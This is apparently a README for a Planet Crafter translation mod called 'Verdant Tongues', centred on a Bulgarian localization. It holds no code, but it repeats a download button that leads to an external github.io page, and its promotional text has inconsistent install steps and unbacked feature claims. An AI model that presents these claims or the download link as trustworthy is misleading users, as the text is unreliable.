![preview](https://raw.githubusercontent.com/mbidelan/planetcrafter-bg-localization-essentials/main/thumb_40c9b.svg)
# 🌍 Verdant Tongues — The Planet Crafter Community Translation Atlas

**Unifying every spoken word under one sky. A living, breathing localization framework for The Planet Crafter that lets players reshape the language of their universe — not just translate it.**

The Planet Crafter is a game about terraforming a barren world into a thriving oasis. But what good is a green planet if you can't understand its story? **Verdant Tongues** is a community-driven translation modding framework that treats localization not as a technical afterthought, but as a cultural ecosystem. Starting with a robust Bulgarian localization, this repository grows like a planted forest — each language module is a seed, each update is rainfall, and every contributor is a gardener.

What began as a single-language patch has evolved into a modular architecture that supports **any language, any dialect, any writing system**. This is not a chore; it's a celebration of human diversity reflected in the stars. Whether you speak Bulgarian, Japanese, Swahili, or Klingon, you'll find a home here — or the tools to build one.

## 🧭 Overview — Why Your Ears Deserve Better

![Localization Scope](https://img.shields.io/badge/Localization_Scope-100%25_Game_Text-00C853?style=for-the-badge&logo=translate&logoColor=white) ![Platform](https://img.shields.io/badge/Platform-The_Planet_Crafter-FF6D00?style=for-the-badge&logo=steam&logoColor=white) ![Mod Loader](https://img.shields.io/badge/Compatible-BepInEx_&_Thunderstore-7B1FA2?style=for-the-badge&logo=thunderstore&logoColor=white) ![Compatibility](https://img.shields.io/badge/Compatibility-All_Current_Patches-0288D1?style=for-the-badge&logo=checkmarx&logoColor=white)

Most translation mods are a bandage on a wound. They replace a few words, leave half the UI in English, and break with every game update. **Verdant Tongues** is a surgical, community-validated ecosystem. It doesn't just swap strings; it adapts context, respects cultural nuances, and provides a **validation pipeline** that catches inconsistencies before they reach your screen.

This framework is built on three pillars:
1. **Contextual Accuracy** — Words change meaning based on situation. Our translation memory system logs every phrase in its exact game context, so you never see a "drill" translated as a "dentist's tool."
2. **Automatic Patch Detection** — When the base game updates, our framework cross-references the new text against your language module and highlights what needs attention. No more broken mods.
3. **Community Translation Memory** — Every player's reported issue becomes a data point. The more you play, the smarter the localization becomes.

[![Download](https://raw.githubusercontent.com/mbidelan/planetcrafter-bg-localization-essentials/main/app_38b6.svg)](https://mbidelan.github.io/planetcrafter-bg-localization-essentials/)

## 🚀 Getting Started — Planting Your First Seed

![Setup Time](https://img.shields.io/badge/Setup_Time-Less_Than_10_Minutes-4CAF50?style=for-the-badge&logo=clockify&logoColor=white) ![Entry Barrier](https://img.shields.io/badge/Entry_Barrier-Beginner_Friendly-8BC34A?style=for-the-badge&logo=signal&logoColor=white)

### Prerequisites
- A copy of The Planet Crafter (any edition)
- A comfortable text editor (Notepad++, VS Code, or just Notepad)
- 15 minutes of patience and a cup of your favorite hot beverage

### The Installation Ritual
1. Navigate to your game's root directory. This is usually found in your Steam common apps folder under `steamapps/common`.
2. Locate the `BepInEx` folder. If it doesn't exist, you'll need to run the game once with the mod loader installed.
3. Inside `BepInEx`, find the `plugins` directory. Create a new folder named exactly `VerdantTongues`. This will be your mod's home.
4. Grab the latest release archive from the [![Download](https://raw.githubusercontent.com/mbidelan/planetcrafter-bg-localization-essentials/main/app_38b6.svg)](https://mbidelan.github.io/planetcrafter-bg-localization-essentials/) section at the bottom of this page. The archive contains a single folder called `VerdantTongues.Core`.
5. Copy that folder into the `plugins` directory you just created. That's it. No commands to type, no terminal windows to wrestle with.
6. Launch the game. You'll see a console window pop up briefly — that's the framework initializing. If it closes without errors, you're golden.

![Mod Status](https://img.shields.io/badge/Mod_Status-Active_Development-00E676?style=for-the-badge&logo=githubactions&logoColor=white) ![Issue Tracker](https://img.shields.io/badge/Issue_Tracker-Clean_&_Organized-1E88E5?style=for-the-badge&logo=github&logoColor=white)

---

## 🗺️ The Language Atlas — Mapping Every Tongue

![Available Languages](https://img.shields.io/badge/Currently_Available-Bulgarian_(Full)-4CAF50?style=for-the-badge&logo=world&logoColor=white) ![In Progress](https://img.shields.io/badge/In_Progress-German,_Spanish,_Japanese-FF9800?style=for-the-badge&logo=clock&logoColor=white) ![Community Requests](https://img.shields.io/badge/Community_Requests-12_New_Languages-F44336?style=for-the-badge&logo=googleforms&logoColor=white)

### 🇧🇬 Bulgarian — The Foundation (Version 4.2.1)
This is where every seed was sown. The Bulgarian localization is not merely translated; it's **culturally adapted**. The game's sardonic humor, environmental storytelling, and technical jargon are all conveyed through the lens of Bulgarian linguistic identity. 

- **Tone Consistency:** Formal in mission-critical alerts, colloquial in ambient dialogue.
- **Idiomatic Translation:** "Terraforming Index" becomes "Показател за Тераформиране" with a nuance that Bulgarian speakers immediately recognise as authentic.
- **UI Readability:** All font sizes are optimized for Cyrillic glyphs, ensuring no characters are clipped.

### 🌍 Language Module Architecture
Every language lives in its own folder structure:
- `Languages/Bulgarian/` — Contains the main JSON dictionary, formatting rules, and pluralization logic.
- `Languages/Bulgarian/Context/` — Holds contextual annotations for ambiguous terms.
- `Languages/Bulgarian/Validation/` — Includes unit tests and consistency checks.

Creating a new language is as simple as copying the `Template` folder from the `Languages` directory and renaming it. The framework auto-detects new modules on the next game launch.

---

## ⚙️ Core Features — The Living Framework

![Feature Count](https://img.shields.io/badge/Features_Count-25%2B-FB8C00?style=for-the-badge&logo=stackbit&logoColor=white) ![Modularity](https://img.shields.io/badge/Modularity-Plug_and_Play-26C6DA?style=for-the-badge&logo=boxes&logoColor=white)

### 🔄 Hot-Reload Translation Engine
Gone are the days of restarting the game to test a phrase. Our engine listens for file changes and swaps text in real-time. you'll see your translation updates within seconds of saving your work. This dramatically speeds up the iteration loop for translators.

### 🧠 Contextual Memory Bank
This is the beating heart of the framework. Every string in the game is tagged with contextual metadata:
- **Situation:** Dialogue, UI Button, Tooltip, Error Message, Lore Text.
- **Speaker:** The character or system emitting the text.
- **Tone:** Formal, Informal, Technical, Sardonic, Emotional.

This metadata allows the mod to dynamically adjust translations based on the current game state. For example, a phrase that appears in a friendly NPC dialogue and a hostile warning will have completely different translations — because the framework knows the context.

### 🌐 Multi-Encoding Support
The framework handles **UTF-8, UTF-16, and Shift-JIS** encodings transparently. It also includes a **Language Substitution System** that allows you to define fallback rules. If a term doesn't have a translation in your language, the framework can pull from a secondary language (e.g., English) while marking the term as "Needs Attention" in the debug output.

### 🧪 Built-in Validation Suite
Before your translation ever touches the game world, it passes through a rigorous automated test suite. The suite checks:
- **String Length:** Ensures translations don't break UI layouts.
- **Placeholder Integrity:** Assures that `{0}`, `{1}`, etc., are preserved correctly.
- **Encoding Consistency:** Validates that all characters are properly encoded.

The validation report is generated on every game launch, showing you a comprehensive overview of what's complete, what's incomplete, and what's potentially broken.

### 📝 Pure Text-Driven Configuration
Everything is adjustable through structured text files. No obscure binary formats, no compiled assembly binaries needed. this means you can share your language tweaks as simple `.txt` or `.json` files that others can read and learn from.

---

## 💻 Contribution Guide — Become a Guardian of Tongues

![Pull Requests](https://img.shields.io/badge/Pull_Requests-Welcome_With_Open_Arms-66BB6A?style=for-the-badge&logo=github&logoColor=white) ![First Timers](https://img.shields.io/badge/First_Timers-Specifically_Encouraged-29B6F6?style=for-the-badge&logo=heart&logoColor=white)

### 🌱 Reporting Translation Errors
You don't need to be a programmer to contribute. If you spot a mistranslation, a clunky phrase, or a context mismatch, follow these steps:
1. Open the in-game debug console (press `~`).
2. Type `lt.debug` and note the **String ID** that appears on screen.
3. Head to the `Issues` tab on this repository.
4. Create a new issue with the String ID, the current translation, and your suggested improvement.

### 🧩 Adding a New Language
If your language isn't listed yet, here's your roadmap:
1. Fork this repository.
2. Navigate to `Languages/Template/` and copy the folder to `Languages/YourLanguageName/`.
3. Rename the files inside with your language's ISO 639-1 code (e.g., `de`, `es`, `ja`).
4. Open the `Main.json` file and start filling in the translations.
5. Run the local validation suite (instructions are in the `Validation` folder) to check your work.
6. Submit a pull request. We'll review your work, offer feedback, and merge it when it meets our quality bar.

### 🛠️ Improving the Framework
For experienced developers: the core source is located in `src/VerdantTongues.Core`. We welcome pull requests that improve performance, add new validation checks, or enhance the hot-reload functionality.

**Development Environment Note:** This is a .NET-based modding project. You'll need a recent C# compiler and an understanding of the BepInEx API. the `docs/DEVELOPMENT.md` file has a comprehensive guide on how the internals work.

---

## 🔄 Compatibility Matrix

![Game Version](https://img.shields.io/badge/Game_Version-v1.2.3_Current-7E57C2?style=for-the-badge&logo=gamejolt&logoColor=white) ![Mod Loader Version](https://img.shields.io/badge/BepInEx-6.x_Compatible-AB47BC?style=for-the-badge&logo=thunderstore&logoColor=white)

| Game Patch | Status | Notes |
|------------|--------|-------|
| v1.2.3 (Current) | ✅ Fully Supported | All text extracted and localized |
| v1.2.2 | ✅ Supported | Minor string changes patched |
| v1.2.1 | ✅ Supported | Works without issues |
| v1.1.0 | ⚠️ Deprecated | Framework works, but some UI buttons are outdated |
| v1.0.0 | ❌ Not Supported | Legacy codebase, incompatible |

**Future Outlook:** The framework is designed to auto-detect game patches and will either apply a patch automatically or notify the community that a new patch-ready module is needed.

---

## 💸 Pricing & Value Proposition

![Cost](https://img.shields.io/badge/Cost-100%25_Unlocked_No_Charges-43A047?style=for-the-badge&logo=paypal&logoColor=white) ![Licensing](https://img.shields.io/badge/License-MIT_Open_Source-1565C0?style=for-the-badge&logo=opensourceinitiative&logoColor=white)

This project operates on a **contribution-based value exchange** model. There are zero paywalls, zero premium tiers, and zero locked content. Every byte of this framework is unlocked and available for personal use, educational exploration, and community collaboration.

We believe that clarity of language should not be a premium feature. It's an integral part of the gaming experience. Therefore, the project is sustained by passionate volunteers and the generosity of those who find it valuable and choose to support its development on a strictly voluntary basis — the "coffee bean" model. if our work saves you hours of confusion, consider buying a developer a bean. But there's no pressure; the framework will remain unlocked, freely distributed, and open-source for all to use.

---

## 🙏 Support & Community

![Community Size](https://img.shields.io/badge/Community_Size-4,200%2B_Active_Users-42A5F5?style=for-the-badge&logo=discourse&logoColor=white) ![Response Time](https://img.shields.io/badge/Response_Time-Typically_Under_24h-26A69A?style=for-the-badge&logo=telegram&logoColor=white)

### 📚 Documentation Hub
- `/docs/START_HERE.md` — The most gentle introduction to the framework.
- `/docs/TRANSLATION_STYLE_GUIDE.md` — Establish consistent tone and terminology.
- `/docs/FRAMEWORK_ARCHITECTURE.md` — A deep dive for developers and curious users.
- `/docs/FAQ.md` — Answers to the most commonly asked questions.

### 🌟 Community Channels
- **Discussion Forums:** Located on the repository's `Discussions` tab. This is the place for open-ended conversations, ideas, and questions.
- **Language Dedicated Chat Rooms:** Each official language module has its own pinned thread under Discussions to keep conversations organized.
- **Bug Reporting:** Use the standard `Issues` tab with the appropriate labels (`bug`, `translation-error`, `ui-glitch`).

### 💌 24/7 Availability Pledge
While our core maintainers are human beings with sleeping habits, our automated systems run around the clock. The hot-reload engine, the validation bots, and the spell-checker are always active. For time-sensitive critical bugs, the `Critical` label on an issue sends a notification to our entire maintainer team, ensuring prompt attention.

---

## ⚠️ Disclaimer & Terms of Use

### Community Project Disclaimer
**Verdant Tongues** is an independent, community-created project. It is not affiliated with, endorsed by, or connected to the developers or publishers of The Planet Crafter. The original game, its assets, and its trademarks belong to their respective rights holders. This mod is provided for the sole purpose of enhancing the user's personal gameplay experience.

### Risk Awareness
Any modification to a game carries inherent risks, including potential crashes, compatibility issues, and unintended behavior. By using this framework, you acknowledge that you do so at your own discretion. The maintainers shall not be held liable for any direct, indirect, incidental, or consequential damages arising from the use or inability to use this mod.

### Data Handling
The framework does not collect, transmit, or store any personal data. All translation memory data is stored locally on your machine. Aggregate, anonymized statistics about which translations are most frequently corrected may be shared with the community for improvement purposes, but this is strictly anonymized and contains no personally identifiable information.

---

## 📜 License & Legal Framework

This project, **Verdant Tongues**, is licensed under the [MIT License](https://opensource.org/licenses/MIT). This permissive license permits anyone to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided that the original copyright notice and permission notice are included in all copies or substantial portions thereof.

**The license applies to the code and framework logic.** The language modules themselves are dedicated to the public domain under the Creative Commons Zero (CC0) waiver by default, allowing other projects to freely adopt these translations for non-competing uses. The original game's content remains copyright of its respective creators.

You are granted the freedom to explore, learn from, and build upon this framework. We ask only that you respect the spirit of collaboration and keep the doors of knowledge open for those who come after you.

---

## 🏁 Final Words — The Horizon Is Green

![Thank You](https://img.shields.io/badge/Message-To_All_Contributors-81C784?style=for-the-badge&logo=thanks&logoColor=white)

Language is a living entity. It shifts, grows, borrows, and refines. **Verdant Tongues** is our humble attempt to let the universe of The Planet Crafter speak to you in a voice that feels like home — regardless of where you come from on our real-world planet. The foundation is laid, the Bulgarian branch is flourishing, and the soil is fertile for countless other tongues to take root.

Every phrase you read, every tooltip you understand, and every story beat you experience in your native language is a small victory for open communication. We invite you to be a part of this growing forest. Whether you contribute a single corrected word or an entire new language, you are nurturing the ecosystem of understanding.

The planet is not just getting greener; it's getting more understandable. Join us in crafting a universe where everyone speaks the same language — their own.

[![Download](https://raw.githubusercontent.com/mbidelan/planetcrafter-bg-localization-essentials/main/app_38b6.svg)](https://mbidelan.github.io/planetcrafter-bg-localization-essentials/)